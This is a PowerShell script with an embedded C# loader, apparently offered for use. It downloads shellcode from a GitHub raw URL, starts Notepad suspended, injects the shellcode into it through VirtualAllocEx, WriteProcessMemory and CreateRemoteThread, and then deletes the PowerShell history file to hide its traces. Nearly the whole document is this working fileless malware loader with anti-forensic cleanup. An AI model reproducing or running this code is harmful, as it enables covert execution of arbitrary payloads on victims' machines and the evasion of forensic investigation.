# --- CONFIGURATION ---
# [IMPORTANT] Paste your Raw GitHub URL here for payload.bin
$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"


# --- PART 1: THE C# LOADER (The Engine) ---
$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class FilelessLoader {
    
    // --- P/Invoke Definitions ---
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine, 
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles, 
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory, 
        ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        uint nSize, 
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
    );

    // --- Corrected Data Structures (The Fix) ---
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { 
        public IntPtr hProcess; 
        public IntPtr hThread; 
        public int dwProcessId; 
        public int dwThreadId; 
    }

    // --- The Main Logic ---
    public static void Execute(string url) {
        try {
            Console.WriteLine("[*] Fetching payload from GitHub...");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient wc = new WebClient();
            byte[] shellcode = wc.DownloadData(url);
            
            if (shellcode.Length == 0) {
                Console.WriteLine("[-] Download failed. Check URL.");
                return;
            }

            Console.WriteLine("[*] Starting Notepad (Suspended)...");
            
            // Initialize the structures correctly
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si); // CRITICAL SIZE FIX
            
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // 0x4 = CREATE_SUSPENDED
            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            
            if (!success) { 
                Console.WriteLine("[-] Failed to create process. Error Code: " + Marshal.GetLastWin32Error()); 
                return; 
            }

            Console.WriteLine("[*] Allocating RWX Memory...");
            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            if (remoteMem == IntPtr.Zero) {
                 Console.WriteLine("[-] Allocation failed.");
                 return;
            }

            Console.WriteLine("[*] Writing Payload...");
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);

            Console.WriteLine("[*] Detonating...");
            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
            
            Console.WriteLine("[+] Injection Complete.");
        }
        catch (Exception e) {
            Console.WriteLine("[-] Critical Error: " + e.ToString());
        }
    }
}
"@


# --- PART 2: ANTI-FORENSICS (The Cleaner) ---
function Invoke-StealthCleanup {
    Write-Host "`n[*] Initiating Anti-Forensic Cleanup..." -ForegroundColor Yellow
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
    $HistoryPath = (Get-PSReadlineOption).HistorySavePath
    
    if (Test-Path $HistoryPath) {
        try {
            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Artifact Deleted: PowerShell History file wiped." -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Cleanup Failed." -ForegroundColor Red
        }
    }
}


# --- PART 3: EXECUTION CHAIN ---

Write-Host "[*] Compiling Loader in Memory..." -ForegroundColor Cyan
try {
    Add-Type -TypeDefinition $Code -Language CSharp
}
catch {
    Write-Error "Compilation Failed."
    exit
}

# [IMPORTANT] This is where your GitHub URL is actually used!
# It passes the $PayloadUrl from the top of the script into the C# Execute() function.
[FilelessLoader]::Execute($PayloadUrl)

# Cleanup
Invoke-StealthCleanup
